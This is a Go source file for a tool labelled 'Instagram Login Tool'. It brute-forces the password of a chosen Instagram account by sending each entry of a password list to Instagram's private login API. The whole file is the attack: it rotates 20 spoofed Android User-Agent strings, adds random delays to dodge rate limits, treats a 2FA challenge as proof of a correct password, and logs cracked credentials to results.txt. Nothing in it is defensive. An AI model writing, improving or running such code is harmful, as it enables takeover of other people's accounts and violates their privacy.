package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

const (
	API_URL      = "https://i.instagram.com/api/v1/"
	TIMEOUT      = 10 * time.Second
	CURRENT_TIME = "2025-05-23 23:14:48"
	CURRENT_USER = "monsmain"
)

// 20 ta User-Agent mokhtalef baraye estefade dar request ha
var userAgents = []string{
    "Instagram 300.0.0.32.111 Android (31/12; 440dpi; 1080x2340; Xiaomi; M2007J3SY; apollon; qcom; en_US; 303701408)",
    "Instagram 293.0.0.54.196 Android (30/11; 480dpi; 1080x2400; samsung; SM-A525F; a52; qcom; en_US; 287841668)",
    "Instagram 292.0.0.21.127 Android (30/11; 420dpi; 1080x2340; OnePlus; DN2103; OnePlusNord2T; mt6877; en_US; 286191234)",
    "Instagram 285.0.0.18.101 Android (29/10; 440dpi; 1080x2340; samsung; SM-M526B; m52x; qcom; en_US; 278451234)",
    "Instagram 280.0.0.21.111 Android (30/11; 480dpi; 1080x2400; Xiaomi; M2101K6G; curtana; qcom; en_US; 273101234)",
    "Instagram 270.1.0.16.99 Android (29/10; 420dpi; 1080x2340; Google; Pixel 4a; sunfish; qcom; en_US; 263191234)",
    "Instagram 260.0.0.27.112 Android (28/9; 480dpi; 1080x2160; Xiaomi; Redmi Note 8 Pro; begonia; mt6785; en_US; 253101234)",
    "Instagram 250.0.0.15.111 Android (30/11; 440dpi; 1080x2340; Samsung; SM-A715F; a71; qcom; en_US; 243101234)",
    "Instagram 240.0.0.18.109 Android (29/10; 480dpi; 1080x2400; Xiaomi; Poco X3 NFC; surya; qcom; en_US; 233101234)",
    "Instagram 230.0.0.16.113 Android (29/10; 420dpi; 1080x2340; OnePlus; ONEPLUS A6013; OnePlus6T; qcom; en_US; 223101234)",
    "Instagram 220.0.0.16.128 Android (30/11; 480dpi; 1080x2400; Xiaomi; Redmi Note 10 Pro; sweet; qcom; en_US; 213101234)",
    "Instagram 210.0.0.28.119 Android (28/9; 480dpi; 1080x2160; Samsung; SM-G780G; s20fe; qcom; en_US; 203101234)",
    "Instagram 200.1.0.21.123 Android (29/10; 420dpi; 1080x2340; HUAWEI; MAR-LX1A; HWMAR; kirin710; en_US; 193101234)",
    "Instagram 195.0.0.32.123 Android (28/9; 480dpi; 1080x2160; Xiaomi; Redmi Note 9S; curtana; qcom; en_US; 188101234)",
    "Instagram 180.0.0.30.119 Android (33/13; 440dpi; 1080x2400; Google; Pixel 6; oriole; gs101; en_US; 210012300)",
    "Instagram 170.0.0.30.474 Android (32/12L; 560dpi; 1440x3120; HUAWEI; ELS-NX9; HWELE; kirin990; en_US; 209100100)",
    "Instagram 166.0.0.30.119 Android (30/11; 560dpi; 1440x3200; samsung; SM-G996B; p2s; exynos2100; en_US; 201112201)",
    "Instagram 160.0.0.30.119 Android (31/12; 440dpi; 1080x2400; Xiaomi; M2007J3SG; apollo; sm8250; en_US; 200001001)",
    "Instagram 150.0.0.33.120 Android (29/10; 420dpi; 1080x2094; HUAWEI; VOG-L29; HWVOG; kirin980; en_US; 185412300)",
    "Instagram 134.0.0.25.121 Android (29/10; 560dpi; 1440x3040; samsung; SM-N960F; crownlte; exynos9810; en_US; 179900210)",
}

type InstagramResponse struct {
	Status     string `json:"status"`
	Message    string `json:"message"`
	ErrorType  string `json:"error_type"`
	ErrorTitle string `json:"error_title"`
	Challenge  struct {
		URL string `json:"url"`
	} `json:"challenge"`
}

func main() {
	logFile, err := os.OpenFile("debug.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		log.SetOutput(logFile)
		defer logFile.Close()
	}

	fmt.Println("=== Instagram Login Tool ===")
	fmt.Printf("Time: %s\n", CURRENT_TIME)
	fmt.Printf("User: %s\n\n", CURRENT_USER)

	var username string
	fmt.Print("Enter Instagram username: ")
	fmt.Scanln(&username)

	passwords := loadPasswords()
	if len(passwords) == 0 {
		fmt.Println("No passwords found in password.txt!")
		return
	}

	fmt.Printf("\nLoaded %d passwords\n", len(passwords))
	fmt.Println("\nStarting login attempts...\n")

	for i, password := range passwords {
		fmt.Printf("[%d/%d] Testing password: %s\n", i+1, len(passwords), maskPassword(password))

		success, response := tryLogin(username, password)

		if success || response.Message == "challenge_required" || response.ErrorType == "challenge_required" {
			fmt.Printf("\n✅ PASSWORD FOUND: %s\n", password)
			fmt.Printf("Username: %s\n", username)
			fmt.Println("✅ Password is correct! (2FA/Challenge Required)")
			saveResult(username, password, true)
			return
		} else {
			if response.ErrorType == "bad_password" {
				fmt.Println("❌ Invalid password")
			} else if response.ErrorType == "invalid_user" {
				fmt.Println("❌ Invalid username")
				return
			} else {
				fmt.Printf("⚠️ Error: %s\n", response.Message)
			}
		}

		// افزایش فاصله زمانی بین درخواست‌ها
		time.Sleep(time.Duration(rand.Intn(5)+5) * time.Second)
	}

	fmt.Println("\n❌ No valid password found!")
	saveResult(username, "", false)
}

func tryLogin(username, password string) (bool, InstagramResponse) {
	loginUrl := API_URL + "accounts/login/"

	data := url.Values{}
	data.Set("username", username)
	data.Set("password", password)
	data.Set("device_id", fmt.Sprintf("android-%d", time.Now().UnixNano()))

	req, err := http.NewRequest("POST", loginUrl, strings.NewReader(data.Encode()))
	if err != nil {
		log.Printf("Error creating request: %v\n", err)
		return false, InstagramResponse{}
	}

	// User-Agent random az list entekhab mishavad
	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US")
	req.Header.Set("X-IG-Capabilities", "3brTvw==")
	req.Header.Set("X-IG-Connection-Type", "WIFI")

	client := &http.Client{Timeout: TIMEOUT}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("Error sending request: %v\n", err)
		return false, InstagramResponse{}
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Printf("Error reading response: %v\n", err)
		return false, InstagramResponse{}
	}

	log.Printf("Raw response: %s\n", string(body))

	var response InstagramResponse
	if err := json.Unmarshal(body, &response); err != nil {
		log.Printf("Error parsing response: %v\n", err)
		return false, InstagramResponse{}
	}

	success := response.Status == "ok" ||
		strings.Contains(string(body), "logged_in_user")

	return success, response
}

func loadPasswords() []string {
	file, err := os.Open("password.txt")
	if err != nil {
		log.Printf("Error opening password file: %v", err)
		return []string{}
	}
	defer file.Close()

	var passwords []string
	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		pass := strings.TrimSpace(scanner.Text())
		if pass != "" {
			passwords = append(passwords, pass)
		}
	}

	return passwords
}

func saveResult(username, password string, success bool) {
	currentTime := CURRENT_TIME
	var status string
	if success {
		status = "✅ SUCCESS"
	} else {
		status = "❌ FAILED"
	}

	logEntry := fmt.Sprintf("[%s] %s\nUsername: %s\nPassword: %s\n\n",
		currentTime, status, username, password)

	file, err := os.OpenFile("results.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("Error saving result: %v", err)
		return
	}
	defer file.Close()

	file.WriteString(logEntry)
}

func maskPassword(password string) string {
	if len(password) <= 4 {
		return "****"
	}
	return password[:2] + strings.Repeat("*", len(password)-4) + password[len(password)-2:]
}
